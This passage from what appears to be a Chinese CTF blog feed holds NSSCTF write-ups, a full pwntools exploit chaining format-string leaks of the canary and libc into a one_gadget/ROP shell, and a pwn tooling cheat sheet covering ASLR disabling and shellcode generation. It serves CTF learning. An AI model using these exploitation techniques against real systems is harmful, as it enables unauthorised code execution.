 ██████╔╝╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║</span></span><br><span class="line"><span class="string">╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝</span></span><br><span class="line"><span class="string">                                                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.system(<span class="string">&quot;rm -f /flag&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(BANNER)</span><br><span class="line">    random.seed(<span class="string">&quot;NSSCTF 2nd&quot;</span>)</span><br><span class="line">    answer=random.randint(<span class="number">0</span>,<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You need to give me the secret!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        func()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>若按照预设命令执行完main.py后，容器会删除flag文件</p>
<p>所以我们自定义docker启动命令</p>
<p>直接执行cat &#x2F;flag</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038709.png" alt="image-20230829233059165"></p>
<h3 id="gift-in-qrcode-revenge"><a href="#gift-in-qrcode-revenge" class="headerlink" title="gift_in_qrcode(revenge)"></a>gift_in_qrcode(revenge)</h3><p>链接一下得到一堆Base64编码</p>
<p>先写个脚本解码Base64保存为png</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Paste the Base64 encoded string here</span></span><br><span class="line">base64_string = <span class="string">&quot;your_base64_string_here&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode the Base64 string</span></span><br><span class="line">decoded_data = base64.b64decode(base64_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the decoded data as a PNG file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;image.png&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decoded_data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038022.png"></p>
<p>扫码得到二十个随机数</p>
<p>根据计算随机数种子，并计算下一个随机数，输入程序中即可拿到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange, getrandbits, seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        secret_seed = i</span><br><span class="line">        seed(secret_seed)</span><br><span class="line">        a = [<span class="number">97</span>,<span class="number">45</span>,<span class="number">232</span>,<span class="number">198</span>,<span class="number">115</span>,<span class="number">215</span>,<span class="number">226</span>,<span class="number">198</span>,<span class="number">32</span>,<span class="number">189</span>,<span class="number">8</span>,<span class="number">210</span>,<span class="number">84</span>,<span class="number">11</span>,<span class="number">150</span>,<span class="number">134</span>,<span class="number">221</span>,<span class="number">207</span>,<span class="number">167</span>,<span class="number">176</span>]</span><br><span class="line">        reveal = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            reveal.append(getrandbits(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">if</span> reveal == a:</span><br><span class="line">            flag = getrandbits(<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="built_in">print</span>(poc())</span><br></pre></td></tr></table></figure>

<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038655.png" alt="image-20230830001615052"></p>
<p>然后最无脑的爆破来了</p>
<p>为什么要爆这么久，早知道我再多爆一会的..</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>, <span class="number">28380</span>)</span><br><span class="line">    conn.recvline().decode()</span><br><span class="line">    conn.recvline().decode()</span><br><span class="line">    conn.recv().decode()</span><br><span class="line"></span><br><span class="line">    conn.sendline(<span class="built_in">str</span>(<span class="string">&#x27;110&#x27;</span>).encode())</span><br><span class="line"></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;count:&#x27;</span>, count)</span><br><span class="line"></span><br><span class="line">    output = conn.recvline().decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;No no no!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038607.png" alt="image-20230830001858060"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h3><p>发现e - 3 ，低加密指数爆破</p>
<p>脚本一把梭</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="comment"># 读入 n, 密文</span></span><br><span class="line">n = <span class="number">115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = gmpy2.iroot(c+i*n,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        m=res[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:].strip(<span class="string">&quot;L&quot;</span>)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i=&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    i = i+<span class="number">1</span></span><br></pre></td></tr></table></figure>



<p>NSSCTF{Rea1_Si9n3n}</p>
<h3 id="FunnyEncrypt"><a href="#FunnyEncrypt" class="headerlink" title="FunnyEncrypt"></a>FunnyEncrypt</h3><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300039451.png" alt="image-20230830002659009"></p>
<p>本来想看看能不能词频分析的，结果发现完全对不到</p>
<p>只好根据已知的nssctf和前面的一堆话里面寻找符合预感的字符与字母对应关系  ， 慢慢对应着可以找到的</p>
]]></content>
      <categories>
        <category>赛题复现</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ROUND#14 wp</title>
    <url>/posts/fa745d1d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ROUND-14-love"><a href="#ROUND-14-love" class="headerlink" title="ROUND#14  love"></a>ROUND#14  love</h1><span id="more"></span>



<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>程序开启NX和canary保护</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101239901.png" alt="image-20230810123951784"></p>
<p>vuln函数中存在栈溢出</p>
<p>变量v4 &#x3D; 555，v5 &#x3D; 520</p>
<p>read函数读入0x40字节，在printf处有格式化字符串漏洞</p>
<p>需要注意buf为bss段变量，非栈格式化字符串漏洞不能直接修改栈上的值，需要通过二级指针，即栈链间接修改</p>
<p>思路：</p>
<ol>
<li>利用格式化字符串漏洞任意写修改让v4&#x3D;v5，进入vuln函数</li>
<li>利用格式化字符串泄露canary和__libc_start_main函数真实地址，计算出libc基址</li>
<li>构造pay覆盖返回地址为og或system rop链getshell</li>
</ol>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>将v4写为520。如图在栈偏移为3的地方有一个栈链：0x7ffe9c35d798-&gt;0x7ffe9c35d788&lt;-0x22b，可以用来修改0x22b为0x208</p>
<p>这里可构造pay为</p>
<blockquote>
<p>pay &#x3D; ‘%’+str(8)+’c’+’%9$hhn’</p>
<p>或者</p>
<p>pay &#x3D; ‘%’+str(520)+’c’+’%9$hhn’  （也可以直接n不用hhn）</p>
</blockquote>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101251928.png" alt="image-20230810125122840"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101249495.png" alt="image-20230810124947461"></p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>泄露canary 和 __libc_start_main地址</p>
<p>这里需要先patchelf再调试确定偏移</p>
<p>这题不仅要patch掉libc和ld，还要再patchelf –replace-needed libpthread.so.0 .&#x2F;libpthread-2.31.so .&#x2F;binary</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101359262.png" alt="image-20230810135900218"></p>
<p>确定canary的偏移为9+6 &#x3D; 15；__libc_start_main+243便宜为11+6 &#x3D; 17</p>
<blockquote>
<p>pay +&#x3D; ‘-%15$p-%17$p-‘</p>
</blockquote>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>覆盖返回地址为one_gadget，或者调用system函数</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101404124.png" alt="image-20230810140417092"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28157)</span></span><br><span class="line"></span><br><span class="line">sda = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">ra = <span class="keyword">lambda</span> :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>() : <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">520</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;-%15$p-%17$p-&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sla(<span class="string">b&#x27;Toka\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露cannary</span></span><br><span class="line">canary = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>),<span class="number">16</span>)-<span class="number">243</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004013f3</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pay=b&#x27;A&#x27;*0x28+p64(canary)+b&#x27;A&#x27;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[&#x27;vuln&#x27;])</span></span><br><span class="line"><span class="comment">#sla(&#x27;level\n&#x27;,pay)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcbase = get_addr64()-libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment">#lg(&#x27;libcbase&#x27;,libcbase)</span></span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>,bin_sh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;level\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret =<span class="number">0x000000000040101a</span> </span><br><span class="line"></span><br><span class="line">og = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ret)+p64(og[<span class="number">1</span>]+libc_base)</span><br><span class="line"><span class="comment">#pay = b&#x27;a&#x27;*0x28+p64(canary)+b&#x27;a&#x27;*8+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span></span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">ra()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>赛题复现</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN一些用到的指令和工具</title>
    <url>/posts/6121198a/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h1><h2 id="ROPgadget-–binary-文件名-–only-“指令-指令”-grep-寄存器或者其他存在的字段"><a href="#ROPgadget-–binary-文件名-–only-“指令-指令”-grep-寄存器或者其他存在的字段" class="headerlink" title="ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段"></a>ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段</h2><p>查找汇编指令的地址</p>
<p>例子：</p>
<blockquote>
<p>ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep eax</p>
<p>ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep ‘: mov eax’ </p>
</blockquote>
<span id="more"></span>



<ul>
<li><p>–only ” | “ 表示只返回含有xx指令或xx指令的gadget</p>
</li>
<li><p>grep  表示含有什么什么特定字段（通常是寄存器）的指令</p>
<p>但是grep能寻找的必须是连续的指令中间不能隔开，连空格都必须一致才能被搜索到</p>
<p>比如你想要搜索<code>0x080701a8 : mov eax, ecx ; ret</code>，你可以用命令<code>ROPgadget --binary get_started_3dsctf_2016 --only &quot;mov|ret&quot; |grep &#39;eax, ecx&#39;</code>；命令<code>ROPgadget --binary get_started_3dsctf_2016 --only &quot;mov|ret&quot; |grep &#39;eax,ecx&#39;</code>无法成功因为逗号和ecx之间少了一个空格</p>
</li>
<li><p>取地址的指令[edx]无法被识别，[ ]在ROPgadget中貌似是表示含有[ ]内字母的指令</p>
<p>比如 ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep ‘[edx]’得到的是这样</p>
<p><img data-src="https://pica.zhimg.com/80/v2-a03e74edb3f031ec31244d7ace622128_720w.png"></p>
</li>
</ul>
<h2 id="ROPgadget-–binary-文件名-–sting-‘-x2F-bin-x2F-sh’"><a href="#ROPgadget-–binary-文件名-–sting-‘-x2F-bin-x2F-sh’" class="headerlink" title="ROPgadget –binary 文件名 –sting ‘&#x2F;bin&#x2F;sh’"></a>ROPgadget –binary 文件名 –sting ‘&#x2F;bin&#x2F;sh’</h2><p>查找字符串地址</p>
<p>例子：</p>
<blockquote>
<p> ROPgadget –binary 文件名 –sting ‘&#x2F;bin&#x2F;sh’</p>
<p> ROPgadget –binary 文件名 –sting ‘&#x2F;sh’</p>
<p> ROPgadget –binary 文件名 –sting ‘sh’</p>
<p> ROPgadget –binary 文件名 –sting ‘cat flag’</p>
<p> ROPgadget –binary 文件名 –sting ‘cat flag.txt’</p>
</blockquote>
<p>![(</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-85292d5975829cdb33d0680fe463d9b0_720w.webp"></p>
<h1 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmmap [-h] [pages_filter]</span><br></pre></td></tr></table></figure>

<p>首先vmmap需要在pwndbg，且程序运行时使用</p>
<ul>
<li>输入vmmap，显示出程序运行时所用到的所有地址段</li>
<li>输入vmmap  地址  ，显示该地址对应的地址段</li>
<li>vmmap  -h，提示帮助；-w只显示可写的部分；-x只显示可执行的部分</li>
</ul>
<p>例子：</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-81b1d3537046d8b961f5b5f4e3ae9265_720w.png"></p>
<p><img data-src="https://picx.zhimg.com/80/v2-d34d469968326f73e2dc20875beb8092_720w.png"></p>
<p><img data-src="https://pic1.zhimg.com/80/v2-1e067d5c59a6e8aa80e6bc37f171f76e_720w.png?source=d16d100b"></p>
<p>第一行，表明了哪个颜色对应哪个段，</p>
<p>start和end对应该地址段的起始和结束位置</p>
<p>Perm 是该段的权限，rwx代表可读、可写、可执行</p>
<p>Size表示该段大小</p>
<p>Offset表示这段与程序基址的偏移</p>
<p>File表示加载的是什么</p>
<h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><p>命令模式下：</p>
<blockquote>
<p>$	行末</p>
<p>^	行首</p>
<p>L	屏幕底行</p>
<p>H	屏幕顶行</p>
<p>yy	拷贝该行</p>
<p>dd	删除该行</p>
<p>P	前粘贴</p>
<p>p	后粘贴</p>
<p>D 	删除至行尾</p>
<p>u	撤销</p>
<p>gg	光标移至行首</p>
<p>dG	删除光标行及光标行以下全部内容</p>
</blockquote>
<p>底线命令模式下：</p>
<blockquote>
<p>:wq		保存并退出</p>
<p>:%d	删除全部内容</p>
<p>:%s		替换       <a href="http://10.102.32.142:8000/d/55-shi-bei-xi-ri-ben-ren-zai-ci-fen-xiang-you-qu-you-yong-de-xin-shou-xue-xi-zi-yuan/13#:~:text=%E5%89%8D%E5%B7%B2%E7%BC%96%E8%BE%91-,vim%E7%9A%84%E6%89%B9%E9%87%8F%E6%9B%BF%E6%8D%A2,-%E5%9C%A8%20Vim%20%E4%B8%AD">参考</a>（万里哥我滴神）</p>
</blockquote>
<h1 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h1><p>基本指令</p>
<ul>
<li>r &#x3D; run 运行程序，如果你当前已经在运行程序了，再输入r会重新运行程序</li>
<li>b &#x3D; break 下断点，在调试pwn中，一般是 b <em>0xabcde ，abcde是在ida中看到的地址,如b</em> 0x400908</li>
<li>c &#x3D; continue 继续运行程序直到停在下一个断点</li>
<li>n &#x3D; next 下一行，一般装了pwndbg之后下一行指的是下一条汇编，但是如果调试的程序是带调试信息的，一般会跳几行汇编</li>
<li>ni &#x3D; nexti 下一条指令，这个就是真正的下一条汇编指令</li>
<li>s &#x3D; step 单步进入函数</li>
<li>d &#x3D; delete 删除断点，后面可带数字，说明删除第几个断点，如果不带参数，说明删除全部断点</li>
<li>x 查看内存</li>
</ul>
<p>c,n,ni这几个程序都可以带一个数字，用来代表连续运行这个指令多少次</p>
<blockquote>
<p> x&#x2F;num xg  地址  64位查看某处地址</p>
</blockquote>
<blockquote>
<p>x&#x2F;num xw  地址  32位查看某处地址</p>
</blockquote>
<blockquote>
<p>s&#x2F;num s  地址  查看从地址开始的num个字符串</p>
</blockquote>
<blockquote>
<p>b *$rebase(地址)           用于开启PIE该指令会在基址+地址处下断点 </p>
</blockquote>
<p><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html">https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html</a><br>100个gdb小技巧</p>
<p>gdb制定程序运行的参数<br>gdb –args binary value</p>
<p>gdb调试改变地址或地址指向值<br>set addr_old &#x3D; addr<br>set *addr_old &#x3D; addr</p>
<p>bt<br>显示函数所有调用栈的信息<br>bt n<br>显示栈顶的n个调用信息<br>bt -n<br>显示栈底的n个调用信息</p>
<p>中间加full表示   显示栈中所有帧的完全信息如：函数参数，本地变量</p>
<h1 id="ASLR和pie编译"><a href="#ASLR和pie编译" class="headerlink" title="ASLR和pie编译"></a>ASLR和pie编译</h1><p>查看系统当前ASLR打开情况</p>
<blockquote>
<p>sudo cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>
</blockquote>
<p>ASLR的三个级别 ：</p>
<p>0， 不开启任何随机化；</p>
<p>1， 开启stack、libraries [、executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化；</p>
<p>2，开启heap随机化。</p>
<p>PIE编译出来的executable如果ASLR&#x3D;0的话，基址也是不会变的（有能力但没使用），如果ASLR&#x3D;1的话，即使按照ASLR定义这个级别似乎不会对heap基址随机化，但是由于executable的基址已经随机化了，所以heap的基址自然也就被随机化了</p>
<blockquote>
<p>指令关闭ASLR</p>
<p>sysctl -w kernel.randomize_va_space&#x3D;0</p>
<p>echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>
</blockquote>
<p>  <img data-src="https://picx.zhimg.com/80/v2-a997d1be275e1071f3a7d542c0874870_720w.png"></p>
<p>fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。 </p>
<blockquote>
<p>gcc  helloworld.c </p>
<p>file a.out a.out: </p>
<p>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.9, not stripped </p>
<p>file a.out a.out: </p>
<p>ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.9, not stripped </p>
</blockquote>
<p>未开启PIE的文件属性为executable，开启的为shared object</p>
<p>注意PIE随机程序加载基地址，要和libc的随机libc库基地址区分</p>
<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>pwntools生成的shellcode默认64位</p>
<blockquote>
<p>shellcode &#x3D; asm(shellcraft.sh()) </p>
</blockquote>
<p>要生成32位的shellcode需要指定</p>
<blockquote>
<p>shellcode &#x3D; asm(shellcraft.sh(),arch&#x3D;’i386’,os&#x3D;’linux’)      </p>
</blockquote>
<p>手动反汇编汇编指令</p>
<blockquote>
<p>xx &#x3D; asm(‘’’</p>
<p>‘’’)</p>
</blockquote>
<h1 id="GCC编译指令"><a href="#GCC编译指令" class="headerlink" title="GCC编译指令"></a>GCC编译指令</h1><p>gcc各保护编译指令<br><a href="https://blog.csdn.net/tabactivity/article/details/126660974">https://blog.csdn.net/tabactivity/article/details/126660974</a><br><a href="https://zoepla.github.io/2018/04/gcc%E7%9A%84%E7%BC%96%E8%AF%91%E5%85%B3%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%E7%9A%84%E9%80%89%E9%A1%B9/">https://zoepla.github.io/2018/04/gcc%E7%9A%84%E7%BC%96%E8%AF%91%E5%85%B3%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%E7%9A%84%E9%80%89%E9%A1%B9/</a><br>全开</p>
<blockquote>
<p>gcc test.c -o test -z noexecstack -z now -fstack-protector -fpie -pie</p>
</blockquote>
<p>全关</p>
<blockquote>
<p> gcc test.c -o test -z execstack -z norelro -fno-stack-protector -no-pie</p>
</blockquote>
<p>sudo sh -c “echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space”关闭ASLR<br>把0换成2就是开启</p>
<p>编译时加上 -m32 即编译成32位程序</p>
<p><a href="https://blog.csdn.net/Jason_ZhouYetao/article/details/81606358">https://blog.csdn.net/Jason_ZhouYetao/article/details/81606358</a></p>
<h1 id="关于符号表"><a href="#关于符号表" class="headerlink" title="关于符号表"></a>关于符号表</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readelf binary -p .comment</span><br><span class="line">或  objdump -s --section=.comment binary</span><br></pre></td></tr></table></figure>
<p>可以查看程序或编译器版本</p>
<p>readelf，objdump，去符号表，恢复符号表<br>上链接<br><a href="https://blog.csdn.net/edonlii/article/details/8779075">readelf</a><br><a href="https://blog.csdn.net/qq_41683305/article/details/105375214">objdump</a><br><a href="https://xuanxuanblingbling.github.io/ctf/tools/2019/09/06/symbol/">去符号表</a><br><a href="https://loora1n.github.io/2022/11/01/%E3%80%90%E7%A5%A5%E4%BA%91%E6%9D%AF2022%E3%80%91PWN-WriteUp-protocol/">恢复符号表</a></p>
<h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><p>patchef四部曲</p>
<p>ldd  binary<br>列出动态库依赖</p>
<p>strings 题目给的libc名 | grep ubuntu<br>快速找到Libc文件对应版本</p>
<p>（cp 想替换的文件到赛题目录）</p>
<p>patchelf –set-interpreter .&#x2F;ld-2.27.so .&#x2F;binary<br>—————————对应的ld文件—-pwn文件</p>
<p>patchelf –replace-needed libc.so.6 .&#x2F;libc-2.27.so .&#x2F;binary<br>————————-原本的libc—-要替换的libc—–pwn文件       </p>
<p>（若只用上述命令碰到如下报错时）<br><img data-src="https://github.com/lmarch2/images/blob/main/typora/202308012217243.png?raw=true"><br>patchelf –replace-needed libpthread.so.0 .&#x2F;libpthread-2.31.so .&#x2F;binary<br> ——————————–原本的     ———   要替换的</p>
<p>Linux命令    </p>
<p>pwd ：获取当前所在目录路径<br>realpath file : 获取文件地址</p>
<p>pip list查看已安装包<br>pip show 包名 查看包安装路径</p>
]]></content>
      <categories>
        <category>实用工具</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2下不能使用gdb.attach的解决方案</title>
